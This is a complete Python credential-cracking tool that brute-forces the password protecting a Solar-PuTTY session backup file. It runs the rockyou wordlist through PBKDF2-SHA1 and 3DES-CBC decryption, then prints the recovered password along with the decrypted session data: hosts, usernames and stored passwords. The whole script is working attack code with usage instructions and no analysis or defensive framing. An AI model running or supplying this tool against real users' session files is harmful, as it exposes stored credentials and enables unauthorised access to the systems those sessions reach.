#!/usr/bin/env python3
"""
decrypt_solar_putty.py — Brute-force Solar-PuTTY .dat session file password
Encryption: 3DES-CBC
Key derivation: PBKDF2-SHA1, 24-byte key, 1000 iterations

Structure of .dat file (after base64 decode):
  Bytes 0-23:  Salt (24 bytes)
  Bytes 24-31: IV (8 bytes)
  Bytes 32-47: Padding/unknown
  Bytes 48+:   3DES-CBC ciphertext

Usage:
  python3 decrypt_solar_putty.py sessions-backup.dat /usr/share/wordlists/rockyou.txt
"""

import base64
import sys
from Crypto.Cipher import DES3
from Crypto.Protocol.KDF import PBKDF2


def try_decrypt(data: bytes, password: str):
    try:
        salt = data[:24]
        iv   = data[24:32]
        ct   = data[48:]
        key  = PBKDF2(password, salt, dkLen=24, count=1000)
        cipher = DES3.new(key, DES3.MODE_CBC, iv)
        dec = cipher.decrypt(ct)
        pad = dec[-1]
        dec = dec[:-pad].decode('utf-8')
        if any(k in dec for k in ('Session', 'Password', 'Host', 'Username')):
            return dec
    except Exception:
        return None


def main():
    dat_file = sys.argv[1] if len(sys.argv) > 1 else 'sessions-backup.dat'
    wordlist = sys.argv[2] if len(sys.argv) > 2 else '/usr/share/wordlists/rockyou.txt'

    with open(dat_file) as f:
        raw = base64.b64decode(f.read().strip())

    print(f"[*] Target : {dat_file} ({len(raw)} bytes)")
    print(f"[*] Wordlist: {wordlist}")
    print("[*] Starting brute-force...\n")

    with open(wordlist, 'r', encoding='latin-1') as wl:
        for i, line in enumerate(wl):
            pw = line.strip()
            result = try_decrypt(raw, pw)
            if result:
                print(f"[+] Password found : {pw}")
                print(f"[+] Decrypted content:\n{result}")
                return
            if i % 10000 == 0:
                print(f"    [...] {i:,} passwords tried", end='\r')

    print("\n[-] Password not found in wordlist")


if __name__ == '__main__':
    main()
